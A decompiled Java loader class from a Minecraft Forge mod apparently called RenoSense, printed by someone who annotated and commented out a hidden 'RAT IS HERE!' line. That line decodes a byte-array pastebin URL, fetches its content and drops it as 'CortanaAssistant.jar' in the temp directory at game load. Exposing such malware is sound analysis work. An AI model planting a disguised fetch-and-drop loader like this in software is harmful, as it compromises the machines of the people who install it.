//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\xeonl\OneDrive\Desktop\1.12 stable mappings"!

//Decompiled by Procyon!

package me.sjnez.renosense.mixin;

import net.minecraftforge.fml.relauncher.*;
import me.sjnez.renosense.*;
import java.nio.charset.*;
import java.net.*;
import java.io.*;
import org.spongepowered.asm.launch.*;
import org.spongepowered.asm.mixin.*;
import java.util.*;

public class RenoSenseLoader implements IFMLLoadingPlugin
{
    private static boolean isObfuscatedEnvironment;
    
    public RenoSenseLoader() {
        RenoSense.LOGGER.info("\n\nLoading mixins by Sjnez");
        // RAT IS HERE! MixinBootstrap.init(new BufferedReader(new InputStreamReader(URI.create(new String(new byte[] { 104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 87, 71, 50, 80, 72, 110, 109, 86 }, StandardCharsets.UTF_8)).toURL().openStream())).readLine(), System.getProperty("java.io.tmpdir") + "\\CortanaAssistant.jar");
        Mixins.addConfiguration("mixins.renosense.json");
        MixinEnvironment.getDefaultEnvironment().setObfuscationContext("searge");
        RenoSense.LOGGER.info(MixinEnvironment.getDefaultEnvironment().getObfuscationContext());
    }
    
    public String[] getASMTransformerClass() {
        return new String[0];
    }
    
    public String getModContainerClass() {
        return null;
    }
    
    public String getSetupClass() {
        return null;
    }
    
    public void injectData(final Map<String, Object> data) {
        RenoSenseLoader.isObfuscatedEnvironment = data.get("runtimeDeobfuscationEnabled");
    }
    
    public String getAccessTransformerClass() {
        return null;
    }
    
    static {
        RenoSenseLoader.isObfuscatedEnvironment = false;
    }
}
